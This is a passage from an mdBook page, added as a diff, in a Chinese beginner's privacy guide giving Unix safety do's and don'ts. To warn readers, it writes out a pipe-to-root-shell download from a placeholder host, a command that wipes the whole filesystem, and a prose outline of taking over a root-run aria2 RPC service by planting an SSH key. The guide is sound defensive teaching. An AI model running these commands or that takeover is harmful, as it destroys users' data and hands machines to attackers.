@@ -1,0 +1,405 @@
+<!DOCTYPE HTML>
+<html lang="zh-Hans" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>网上教程不会告诉你的类 Unix 使用注意事项 - privacy.noarch</title>
+        
+        
+
+
+        <!-- Custom HTML head -->
+        
+
+
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="一本面向新手的隐私教程">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        
+        
+        <link rel="shortcut icon" href="../../favicon.png">
+        
+        <link rel="stylesheet" href="../../css/variables.css" media="print" onload="this.media='all'">
+        <noscript><link rel="stylesheet" href="../../css/variables.css"></noscript>
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        
+
+        <!-- Font Awesome 5.13 free content -->
+        <link rel="stylesheet" href="../../FontAwesome/css/all.css" media="print" onload="this.media='all'">
+        <link rel="stylesheet" href="../../FontAwesome/css/v4-shims.css" media="print" onload="this.media='all'">
+        <noscript>
+            <link rel="stylesheet" href="../../FontAwesome/css/all.css">
+            <link rel="stylesheet" href="../../FontAwesome/css/v4-shims.css">
+        </noscript>
+
+        <!-- Fonts -->
+        
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css" media="print" onload="this.media='all'">
+        <link rel="stylesheet" href="../../tomorrow-night.css" media="print" onload="this.media='all'">
+        <link rel="stylesheet" href="../../ayu-highlight.css" media="print" onload="this.media='all'">
+        <noscript>
+            <link rel="stylesheet" href="../../highlight.css">
+            <link rel="stylesheet" href="../../tomorrow-night.css">
+            <link rel="stylesheet" href="../../ayu-highlight.css">
+        </noscript>
+
+        <!-- Custom theme stylesheets -->
+        
+        <link rel="stylesheet" href="../../sidebar.css" media="print" onload="this.media='all'">
+        <noscript><link rel="stylesheet" href="../../sidebar.css"></noscript>
+        
+
+        
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "light" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../index.html">privacy.noarch</a></li><li class="chapter-item expanded affix "><a href="../../SUMMARY.html">目录</a></li><li class="chapter-item expanded affix "><div>前言</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">1.</strong> 在开始前</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../Fundamentals/BasicOfTheBasics.html"><strong aria-hidden="true">1.1.</strong> 常见错误集合：线上安全基本原则</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> 从可信的来源安装软件</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">2.1.</strong> [Android] F-Droid</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.2.</strong> [Android] Aurora Store</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> 安全地使用浏览器上网</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../Browsers/Bromite/Bromite.html"><strong aria-hidden="true">3.1.</strong> [Android] Bromite</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.2.</strong> [Desktop/All] Firefox</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">3.2.1.</strong> 使用插件来增强浏览体验 ^</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.3.</strong> [Desktop/All]Tor Browser ^</div></li></ol></li><li class="chapter-item expanded "><a href="../../Input/Input.html"><strong aria-hidden="true">4.</strong> 自由打字，打字自由</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../Input/NoNetworkAccess/NoNetworkAccess.html"><strong aria-hidden="true">4.1.</strong> [Android] 禁止输入法联网</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.2.</strong> 同文输入法 (TRIME) ^</div></li></ol></li><li class="chapter-item expanded "><a href="../../Passwords/Passwords.html"><strong aria-hidden="true">5.</strong> 帐号安全：保护，隔离，整理</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../Passwords/PasswordManagers.html"><strong aria-hidden="true">5.1.</strong> 让密码管理器帮你记住密码</a></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">5.1.1.</strong> [Android] Bitwarden</div></li><li class="chapter-item expanded "><a href="../../Passwords/BitwardenWeb/BitwardenWeb.html"><strong aria-hidden="true">5.1.2.</strong> [Web] Bitwarden</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.1.3.</strong> [Desktop/All] KeePassXC ^</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.2.</strong> 二步验证 - 增强帐号安全</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">5.2.1.</strong> [Android] andOTP</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.2.2.</strong> [Desktop/All] KeePassXC 的二步验证功能</div></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../../WallBreak/WallBreak.html"><strong aria-hidden="true">6.</strong> 突破网络长城</a></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">6.1.</strong> 代理提供商</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">6.2.</strong> 代理工具 ^</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">6.2.1.</strong> V2Ray</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">6.2.2.</strong> Trojan</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">6.2.3.</strong> Shadowsocks*</div></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">7.</strong> 在享受自由言论之前：“分裂人格”的魅力</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../Identities/iYP_DID/iYP_DID.html"><strong aria-hidden="true">7.1.</strong> [转载] 分身术完整指南：妥善管理您的在线身份并获得安全的方法</a></li><li class="chapter-item expanded "><a href="../../Identities/WorldIsMine/WorldIsMine.html"><strong aria-hidden="true">7.2.</strong> [转载] 一个网友的“个人网络身份整改方案”</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">8.</strong> 在网络围墙外社交</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">8.1.</strong> 中心化</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">8.1.1.</strong> [All] Telegram</div></li><li class="chapter-item expanded "><a href="../../RTC/Signal/Signal.html"><strong aria-hidden="true">8.1.2.</strong> [Android] Signal</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">8.2.</strong> 去中心化 ^</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">8.2.1.</strong> [Android/iOS] Matrix/Element</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">8.2.2.</strong> [Web] Matrix/Element</div></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">9.</strong> 私密地发送和接收邮件</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">9.1.</strong> 邮件提供商</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">9.1.1.</strong> [Web] ProtonMail</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">9.1.2.</strong> [Web] Tutanota</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">9.2.</strong> 邮件客户端 ^</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">9.2.1.</strong> [Android] K-9 Mail</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">9.2.2.</strong> [Desktop/All] Thunderbird</div></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../../Encryption/Encryption.html"><strong aria-hidden="true">10.</strong> 加密，加密一切</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../Encryption/Pubkey/Pubkey.html"><strong aria-hidden="true">10.1.</strong> [翻译] 公钥加密简介</a></li><li class="chapter-item expanded "><a href="../../Encryption/OpenKeychain/OpenKeychain.html"><strong aria-hidden="true">10.2.</strong> [Android] PGP: OpenKeychain</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.</strong> Android 玩机技巧 ^</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">11.1.</strong> 系统设置</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.2.</strong> “刷机”基础</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">11.2.1.</strong> 深入了解自己的设备</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.2.2.</strong> 选择第三方 ROM</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.3.</strong> Magisk</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.4.</strong> microG</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">12.</strong> Windows 玩机技巧 ^</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../Tricks-Windows/VHD/VHD.html"><strong aria-hidden="true">12.1.</strong> 使用 VHD(X) 部署原生多系统 ^</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">13.</strong> 类 Unix 玩机技巧 ^</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../Tricks-Unix/dos-donts/dos-donts.html" class="active"><strong aria-hidden="true">13.1.</strong> 网上教程不会告诉你的类 Unix 使用注意事项</a></li></ol></li><li class="chapter-item expanded "><div>后记</div></li><li class="chapter-item expanded affix "><a href="../../CONTRIBUTING.html">反馈与贡献</a></li></ol>
+
+                <!-- mods to the vanilla sidebar-->
+                <hr/>
+                <p>© 2020-2021 <code>privacy.noarch</code> project.</p>
+                <p><a href="https://t.me/privacy_noarch" target="_blank"><img src="/images/badge-telegram.svg" height=20></a></p>
+                <p><a href="https://git.n0ar.ch/privacy" target="_blank"><img src="/images/badge-git.svg" height=20></a></p>
+                <p><a href="https://www.gnu.org/licenses/fdl-1.3.html" target="_blank"><img src="/images/badge-gfdl.svg" height=20></a></p>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        
+                    </div>
+
+                    <h1 class="menu-title">privacy.noarch</h1>
+
+                    <div class="right-buttons">
+                        <a title="Switch between Simplified and Traditional Chinese" aria-label="Switch between Simplified and Traditional Chinese" class="icon-button" onclick=
+                        "
+                        'use strict';
+
+                        const CN_CLEAR = 'privacy.n0ar.ch';
+                        const TW_CLEAR = 'privacy-tw.n0ar.ch';
+                        const CN_TOR = 'fluffyvv5b7iztvxxpu23ylr3o7dxgcgszqx5eb7drk35jyzkrk5q2ad.onion';
+                        const TW_TOR = 'tw.fluffyvv5b7iztvxxpu23ylr3o7dxgcgszqx5eb7drk35jyzkrk5q2ad.onion';
+
+                        switch (window.location.hostname) {
+                            case CN_CLEAR:
+                                window.location.hostname = TW_CLEAR;
+                                break;
+                            case TW_CLEAR:
+                                window.location.hostname = CN_CLEAR;
+                                break;
+                            case CN_TOR:
+                                window.location.hostname = TW_TOR;
+                                break;
+                            case TW_TOR:
+                                window.location.hostname = CN_TOR;
+                                break;
+                            default:
+                                window.alert('Error determining current site language.\nI\'m either being served locally, or running as a mirror.\n\nIf you are running a mirror, please change the hostnames on line ~166 in theme/index.hbs.');
+                                break;
+                        }
+                        ">
+                            <strong>简/繁</strong>
+                        </a>
+                        
+                        
+                        <a href="https://github.com/noarchwastaken/privacy" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+                        
+                    </div>
+                </div>
+
+                
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <!-- Page table of contents -->
+                        <div class="sidetoc"><nav class="pagetoc"></nav></div>
+
+                        <h1 id="网上教程不会告诉你的类-unix-使用注意事项"><a class="header" href="#网上教程不会告诉你的类-unix-使用注意事项">网上教程不会告诉你的类 Unix 使用注意事项</a></h1>
+<hr />
+<pre><code>$ curl https://lorem.ipsum/dolor.sh | sudo bash
+</code></pre>
+<p>上面的一行命令，你看着熟悉吗？</p>
+<p><em>noarch</em> 现在告诉你，这个你将要运行的 <code>dolor.sh</code> 内容是这样的：</p>
+<pre><code>rm -rf / --no-preserve-root
+</code></pre>
+<p>如果你在使用 GNU/Linux 或 *BSD, 运行它会删除你电脑上的所有数据，需要你耗费大量精力找回。</p>
+<p>这类操作系统自由度极高，但也代表着人为损坏的门槛更低；因此你需要在使用时多加注意。</p>
+<p>下面是 <em>noarch</em> 在数年 GNU/Linux 使用过程中总结出的 do's &amp; don'ts.</p>
+<h2 id="不-运行未知脚本"><a class="header" href="#不-运行未知脚本"><em>不：</em> 运行未知脚本</a></h2>
+<p>我们再来看下开头 <em>noarch</em> 提到的命令：</p>
+<pre><code>$ curl https://lorem.ipsum/dolor.sh | sudo bash
+</code></pre>
+<p>它其中的管道符号 <code>|</code> 代表所有从 <code>curl</code> 输出的内容均会被盲目地被 <code>sudo bash</code> 执行。</p>
+<p>你可能会问，<em>那我是不是就不要运行脚本了？</em></p>
+<p>当然不是。前提是你<em>在运行脚本之前了解自己在运行些什么。</em> <em>noarch</em> 取这个使用管道符号运行脚本的例子，还强调审核脚本的重要性。</p>
+<p><em>noarch</em> 建议你在运行任何脚本之前，先下载下来粗略阅读一遍，然后再给它可执行权限运行。这样你至少知道自己在运行什么。</p>
+<h3 id="你真的需要一键脚本吗"><a class="header" href="#你真的需要一键脚本吗">你真的需要一键脚本吗？</a></h3>
+<p><em>noarch</em> 的个人意见：<em>使用他人的一键脚本，可视化面板等不是学习 Unix 的好方法。</em></p>
+<p>脚本没法覆盖所有使用情况，不知道目标机器的硬件配置，因此往往只能取一个“刚好能运行”的配置。</p>
+<p>例如，如果你使用一个脚本配置 LNMP (Linux + Nginx + MySQL + PHP), 你的 Nginx 配置可能不会禁用不安全的 HTTP, 并且未启用<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security">严格传输安全</a>。</p>
+<p>这让你的网站暴露于 TLS 降级攻击：一个过度简单的描述就是中间人攻击者拦截客户端开始 HTTPS 通讯的请求，使得客户端只使用 HTTP 访问你的网站。攻击者再可以由此窃取你用户的帐号密码，修改你网站的内容...</p>
+<p>除了安全问题之外，忽略细节需要牺牲性能：因为<a href="https://www.acunetix.com/blog/articles/tls-vulnerabilities-attacks-final-part/">安全问题</a>，众多发行版的 Nginx 安装都默认禁用 Gzip 压缩。这会让你的用户和服务器浪费许多宝贵的流量，并降低加载速度。如果你手动配置 Nginx 并愿意了解更多技术细节，你就可以专门为静态资源 (CSS, JS...) 启用 Gzip.</p>
+<p>Gzip 配置得当<a href="https://www.rootusers.com/gzip-vs-bzip2-vs-xz-performance-comparison/">能帮你省下超过 70% 的流量</a>！</p>
+<h2 id="不-复制粘贴进-shell"><a class="header" href="#不-复制粘贴进-shell"><em>不：</em> 复制粘贴进 shell</a></h2>
+<p>你在浏览器内复制的东西不永远是你想的那样。</p>
+<p>网站可以用 Javascript <a href="https://briantracy.xyz/writing/copy-paste-shell.html">劫持你的剪贴板</a>，让你复制与你选择时完全不同的内容。</p>
+<p>并且，你在粘贴时，甚至不需要手动按回车执行指令：在大多数默认情况下，恶意剪贴板劫持内的一个换行字符就足以让命令在你粘贴时就运行。</p>
+<p>即使你是 <a href="https://ohmyz.sh/"><code>oh-my-zsh</code></a> 的用户，启用了 <a href="https://cirw.in/blog/bracketed-paste">bracked pasting</a>, 恶意代码也可以通过包含 bracketed pasting 字符来逃逸这个功能，就像众多 SQL injection 一样。</p>
+<p>一些终端模拟器，例如 iTerm2, <code>gnome-terminal</code> 和 <code>Terminal.app</code> 会自动将 bracket 字符转义，这样你相对不怎么需要担心最后一点。</p>
+<h3 id="粘贴进-vim-也不安全"><a class="header" href="#粘贴进-vim-也不安全">粘贴进 <code>vim</code> 也不安全</a></h3>
+<p>你可能以为 Vim 只是一个文本编辑器，你在其中粘贴内容是安全的；</p>
+<p>但恶意代码还可以利用 Vim 的宏功能执行命令。<a href="https://github.com/dxa4481/Pastejacking">这是另一个 Demo</a>, 以及一些应对措施。</p>
+<h3 id="那我如何科学地复制粘贴"><a class="header" href="#那我如何科学地复制粘贴">那我如何科学地复制粘贴？</a></h3>
+<p>最好的方案 - 不要复制粘贴互联网上的内容到 Shell 等允许执行指令的地方。</p>
+<p>如果你实在要粘贴，一个更基本的文本编辑器，例如 <code>gedit</code> 可能适合你的需求。</p>
+<p>如果你愿意接受一些代价，你也可以禁用浏览器的 Javascript 复制粘贴功能：</p>
+<p>以 Firefox 或 Tor 浏览器为例，去 <code>about:config</code> 里禁用 <code>dom.allow_cut_copy</code>.</p>
+<p>这会阻止所有 Javascript 引起的复制粘贴行为，意味着例如 Google Docs 以及 mdBook <code>clipboard.js</code> 这些对 Javascript 剪贴板的合法应用将会失效。</p>
+<h2 id="不-安装野包"><a class="header" href="#不-安装野包"><em>不：</em> 安装野包</a></h2>
+<p>“野包”指除了发行版官方软件源之外的软件包。</p>
+<p>例如，<a href="https://discord.com/">Discord</a> 是一个专有软件，因违反许多发行版的规定而无法进入官方软件源；而你获得它的方法之一就是通过 Discord 官网下载它的 <code>.deb</code> 软件包；这个来自 Discord 网站的软件包就称之为“野包”。</p>
+<p>另一个例子是 <a href="https://docs.docker.com/engine/install/debian/"><code>docker-ce</code></a>, 它用来在老系统上运行最新版 Docker.</p>
+<p>需要注意的是，Canonical 的 PPA, Arch Linux AUR 等都属于“野包”。它们不受到发行版的稳定性/兼容性保障。</p>
+<p>这些“野包”为系统带来了诸多威胁：</p>
+<ul>
+<li>
+<p>为了最大化兼容性，野包往往自己打包所有依赖库，而这些依赖库不随系统更新。</p>
+<ul>
+<li>如果某个依赖出现安全问题，你将需要依靠软件发布者进行更新；</li>
+</ul>
+</li>
+<li>
+<p>除此之外，不带软件源的“野包”还完全无法自动更新；</p>
+</li>
+<li>
+<p>如果野包使用系统依赖，那么问题更大了：你在进行发行版大更新时，它们大概率会因为 ABI/API 变更集体罢工；</p>
+<ul>
+<li>如果野包注册了服务开机自启，它甚至可能会导致你的电脑完全无法开机；</li>
+</ul>
+</li>
+<li>
+<p>不明来源的包能像上述脚本一样在安装时运行脚本完全摧毁你的系统。</p>
+</li>
+</ul>
+<h3 id="野包的替代"><a class="header" href="#野包的替代">野包的替代</a></h3>
+<p>以上述 Discord 为例，你可以在 <a href="https://flathub.org/home">Flathub</a> 上找到<a href="https://flathub.org/apps/details/com.discordapp.Discord">它的 Flatpak 版</a>；这个 Flatpak 版虽然也打包所有依赖，但它在沙盒内运行，并且能够被统一更新。</p>
+<p>来自 Ubuntu 的 <a href="https://snapcraft.io/">Snap</a> 也提供了类似 Flatpak 的沙盒环境，让你能够更安全地运行专有软件。</p>
+<p>除了用于运行专有软件以外，Flatpak 和 Snap 还提供许多软件的更新版本；</p>
+<p>例如在本文编写时，Debian 10 提供 GIMP 2.10.8, 但你可以通过 Flatpak 运行 GIMP 2.10.22 或 GIMP 3 的最新测试版，而不用担心它们突然损坏系统。</p>
+<p>至于 <code>docker-ce</code>, 它在大多数情况下不必要；例如 Debian 就提供了 <a href="https://packages.debian.org/buster/docker.io"><code>docker.io</code></a>. 你将来还可以使用 <a href="https://packages.debian.org/bullseye/podman"><code>podman</code></a> 来代替 Docker, 并且 Podman 相比 Docker 不需要后台守护进程。</p>
+<h3 id="make-install"><a class="header" href="#make-install"><code>make install</code>?</a></h3>
+<p>当你运行 <code>make install</code> 时，你在运行开发者给你的一个安装脚本；根据你 <code>./configure</code> 时配置的选项，它可能会将软件安装到 <code>/usr/local/</code>. 这样还好，因为这个地方专属于“野包”；</p>
+<p>但是，类似于<a href="#%E4%B8%8D-%E8%BF%90%E8%A1%8C%E6%9C%AA%E7%9F%A5%E8%84%9A%E6%9C%AC">不运行未知脚本</a>，请在 <code>make install</code> 前检查 <code>Makefile</code>, 确保你能将它卸载干净。你也可以使用 <code>debuild</code> 来与 Makefile 交互，自己创建一个相对好一点（至少能被 <code>dpkg</code> 追踪）的“野包”。</p>
+<h3 id="别无选择"><a class="header" href="#别无选择">别无选择？</a></h3>
+<p>有意思的是，<em>noarch</em> 上面讲到的“野包”之一就是安全运行野包的一个方法。</p>
+<p>你可以使用 Podman 或 Docker 运行一个发行版容器，然后在容器里安装野包。任务完成后，把容器删除即可。如果你需要更多安全性，虚拟机也是一个好主意。</p>
+<h2 id="不-使用静默选项"><a class="header" href="#不-使用静默选项"><em>不：</em> 使用静默选项</a></h2>
+<p><img src="images/apt-disaster.png" alt="apt 自动删除出现问题" /></p>
+<p>图源：<a href="https://t.me/k4yt3x">@k4yt3x</a></p>
+<p>上图是为什么你不应该使用静默选项的一个绝佳例子。图中 @k4yt3x 尝试使用 <code>apt full-upgrade</code> 升级系统，然而 <code>telegram-desktop</code> 却与现有的 QT5 冲突，引出一串删除包的动作。</p>
+<p>如果他在这里使用了 <code>-y</code> 来自动确认，整个 QT5 框架将会被卸载；如果他再懒一些，还使用了 <code>--autoremove --purge</code>, 后果将不堪设想。</p>
+<h2 id="不-使用-root-登录"><a class="header" href="#不-使用-root-登录"><em>不：</em> 使用 <code>root</code> 登录</a></h2>
+<p>一直使用 <code>root</code> 账户登录，除了严重安全问题之外，你还被暴露在手滑的风险下。</p>
+<p>例如你想 <code>rm -rf ./*</code>, 却多打了一个空格，变成了 <code>rm -rf . /*</code>, 这个操作不仅不会触发 preserve-root, 并且后果与直接删除 <code>/</code> 没有什么区别。</p>
+<h3 id="不-root-运行服务"><a class="header" href="#不-root-运行服务"><em>不：</em> <code>root</code> 运行服务</a></h3>
+<p><em>noarch</em> 再举一个例子：你使用 <a href="https://aria2.github.io/">aria2</a> 搭建了一个下载机。</p>
+<p>你对安全并非完全不重视，使用了 ssh key 登录，并且限制了可以访问 ssh 的 IP 地址。</p>
+<p>但你犯了一个错误：你在 <code>root</code> 登录的情况下使用 <code>nohup</code> 在后台运行 <code>aria2c</code>, 并且暴露了 RPC 端口。</p>
+<p>在不利用任何 0day 的情况下，攻击者只需要找出你的 aria2 RPC 密钥（你为了方便，它多半是一个弱密码），然后下载他的 ssh 公钥到 <code>/root/.ssh/authorized_keys</code>, 这台机器就是他的了。</p>
+<p><em>noarch</em> 推荐的使用方法是为 <code>aria2c</code> 创建一个专门，低权限的用户，然后将它以这个用户运行；你还可以为它创建一个 <code>systemd</code> 服务，指定运行时的用户和组，或者使用 <code>systemd</code> 的<a href="https://www.freedesktop.org/software/systemd/man/systemd.exec.html#DynamicUser=">动态用户</a>功能。</p>
+<h3 id="不-nobody-运行服务"><a class="header" href="#不-nobody-运行服务"><em>不：</em> <code>nobody</code> 运行服务</a></h3>
+<blockquote>
+<p><i class="fas fa-check-circle"></i> 感谢 <a href="https://t.me/karuboniru">@Karuboniru</a> 的勘误！</p>
+</blockquote>
+<p>你可能觉得，系统里最低权限的用户是 <code>nobody</code>, 也确实有很多教程叫你把服务在 <code>nobody</code> 下运行。<em>那么以后低权限的进程都用 <code>nobody</code>?</em></p>
+<p>很抱歉，这是一个误导。<em>noarch</em> 在<a href="https://github.com/noarchwastaken/privacy/commit/707dfe884294a2667008c10359704264ba126e0a">本章第一版</a>时也犯了这个错误。</p>
+<p>使用 <code>nobody</code> 运行服务，会使你的服务意外获得其它在 <code>nobody</code> 下的资源。<code>nobody</code> 还被 Linux 内核<a href="https://fedoraproject.org/wiki/Changes/RenameNobodyUser">用来映射无法映射到当前命名空间内的 UID</a>, 例如 NFS 使用的 32 位 UID.</p>
+<h2 id="不-盲目跟随教程"><a class="header" href="#不-盲目跟随教程"><em>不：</em> 盲目跟随“教程”</a></h2>
+<p><img src="images/bad-advice.jpg" alt="错误指引" /></p>
+<p>图源：<a href="https://t.me/ducksoft">@ducksoft</a></p>
+<p>刚看完上一节<a href="#%E4%B8%8D-%E5%AE%89%E8%A3%85%E9%87%8E%E5%8C%85">不安装野包</a>，你应该意识到上图的行为像是自杀。它将 <code>rpm</code> 包强行安装在基于 Debian 的发行版上，后果可想而知...</p>
+<p>包括 <em>noarch</em> 在内，互联网上的教程编者也经常犯错误，或者无法及时更新他们的教程。（就看上一节<a href="">不 <code>nobody</code> 运行服务</a>！）</p>
+<p>盲目跟随这些教程可能使你陷入死胡同，使用一个已经被抛弃的配置，例如在 Nginx 上启用 SSLv3. （永远别尝试在生产环境上这么做！）</p>
+<p>如果你觉得你在遵循的教程有点奇怪或过时，请阅读 man pages.</p>
+<h2 id="最好-阅读-man-pages"><a class="header" href="#最好-阅读-man-pages"><em>最好：</em> 阅读 man pages</a></h2>
+<p>说起 man pages, 它是学习类 Unix 系统的最好方法：软件的官方文档通常就被打包为 man pages - 文档页。</p>
+<p>例如，<em>noarch</em> 要为自己搭建一个 <code>cgit</code> 可视化，而我不知道如何配置 <code>cgitrc</code> (<code>cgit</code> 的配置文件)。</p>
+<p>这时 <em>noarch</em> 只需要运行 <code>man cgitrc</code>, 这个由 <code>cgit</code> 开发者写的文档内就告诉了 <em>noarch</em> 这个配置文件的格式，配置项以及它们的用途。比网上某个教程可靠得多！</p>
+<p>阅读 man pages 可能比盲目跟随网上教程耗时长，但它绝对能给你省下后续解决问题的时间。</p>
+<p>如果你是 *BSD 用户，因为互联网上几乎没有傻瓜式教程，阅读 man pages 几乎是你生活不可或缺的一部分。</p>
+<h2 id="最好-定期备份"><a class="header" href="#最好-定期备份"><em>最好：</em> 定期备份</a></h2>
+<p>如果你在 <code>privacy.noarch</code> 的 <a href="https://privacy.n0ar.ch/chat">Telegram 群</a>内活跃，你应该知道 <em>noarch</em> 使用 <a href="https://btrfs.wiki.kernel.org/index.php/Main_Page">Btrfs</a>.</p>
+<p>Btrfs 的<a href="https://en.wikipedia.org/wiki/Copy-on-write">写入时复制</a>特性为 <em>noarch</em> 的日常备份带来了极大便利；并且它也多次在 <em>noarch</em> 搞坏系统时拉了我一把。</p>
+<p>别急着转换文件系统到 Btrfs; <em>noarch</em> 想要传达的信息是，时常备份系统能在你玩脱时把你救回来。</p>
+<p>无论是云服务器提供商的“快照”功能，还是简单地复制 <code>home</code> 目录，保留对你而言重要的数据是“不玩脱”重要的一环。</p>
+<h2 id="最好-拥抱自由软件"><a class="header" href="#最好-拥抱自由软件"><em>最好：</em> 拥抱自由软件</a></h2>
+<p>运行着 GNU/Linux, 却还在寻找运行 Microsoft Office, Adobe Photoshop, Discord 等专有软件的方法？</p>
+<p>这可能是现在的你，这也是曾经的 <em>noarch</em>.</p>
+<p>在 GNU/Linux 或 *BSD 上运行专有软件，专有软件会将你作为“二等公民”对待。</p>
